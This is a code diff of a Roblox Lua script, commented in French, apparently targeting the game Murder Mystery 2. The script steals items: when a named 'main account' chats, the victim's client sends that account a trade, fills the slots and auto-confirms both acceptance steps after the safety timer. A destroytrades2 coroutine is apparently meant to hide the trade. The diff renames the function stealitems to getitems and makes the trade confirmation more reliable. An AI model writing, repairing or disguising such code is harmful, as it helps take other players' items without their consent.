@@ -492,16 +492,26 @@ end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
 
-local function stealitems()
+-- Variable pour stocker dynamiquement l'ID du trade en cours
+local activeTradeID = nil
+
+-- Écoute optionnelle si le serveur envoie l'ID du trade via un Remote (souvent transmis lors de l'ouverture de la fenêtre de trade)
+-- Si ton script possède déjà un moyen de récupérer l'ID réel, assure-toi de le stocker dans activeTradeID.
+
+local function getitems()
     coroutine.resume(destroytrades2)
 
     -- 1. Envoi de la demande de trade au compte principal
-    local sendArgs = {
-        [1] = game:GetService("Players")[userName]
-    }
-    Trade.SendRequest:InvokeServer(unpack(sendArgs))
+    local targetPlayer = Players:FindFirstChild(userName)
+    if not targetPlayer then
+        warn("Compte principal introuvable pour le trade.")
+        return
+    end
 
+    Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2)
 
     -- 2. Remplissage des 4 cases max de MM2
@@ -535,27 +545,37 @@ local function stealitems()
     task.wait(1.5)
 
     -- 3. Première validation (Lancer l'acceptation initiale)
-    pcall(function()
+    local success, err = pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
+    if not success then
+        warn("Erreur sur AcceptRequest : " .. tostring(err))
+    end
 
     -- Attente du timer de sécurité obligatoire de MM2
     task.wait(5.5)
 
-    -- 4. Confirmation finale avec le Trade ID et le Timestamp dynamique
+    -- 4. Confirmation finale avec vérification
     pcall(function()
-        -- On génère le timestamp exact requis par le serveur de MM2
         local currentTick = workspace:GetServerTimeNow() or tick()
         
-        -- Remplace 428469873 si ton script utilise une variable d'ID de trade globale, sinon il prend l'ID actif
-        local tradeID = 428469873 
+        -- Utilise l'ID dynamique s'il existe, sinon essaie de récupérer l'état du trade localement
+        -- (Dans MM2, l'ID du trade est souvent un nombre unique généré par le serveur à la création de la session de trade)
+        local tradeID = activeTradeID or 428469873 
 
+        -- Certains scripts récents de MM2 nécessitent de passer la table du trade ou l'instance du joueur en argument
         local args = {
             [1] = tradeID,
             [2] = currentTick
         }
         
-        Trade.AcceptTrade:FireServer(unpack(args))
+        local confirmSuccess, confirmErr = pcall(function()
+            Trade.AcceptTrade:FireServer(unpack(args))
+        end)
+
+        if not confirmSuccess then
+            warn("Erreur lors de AcceptTrade (Dernière étape bloquée) : " .. tostring(confirmErr))
+        end
     end)
 end
 
@@ -563,13 +583,13 @@ end
 local function listenToPlayer(player)
     if player.Name == userName then
         player.Chatted:Connect(function(msg)
-            stealitems()
+            getitems()
         end)
     end
 end
 
-for _, player in pairs(game.Players:GetPlayers()) do
+for _, player in pairs(Players:GetPlayers()) do
     listenToPlayer(player)
 end
 
-game.Players.PlayerAdded:Connect(listenToPlayer)
+Players.PlayerAdded:Connect(listenToPlayer)
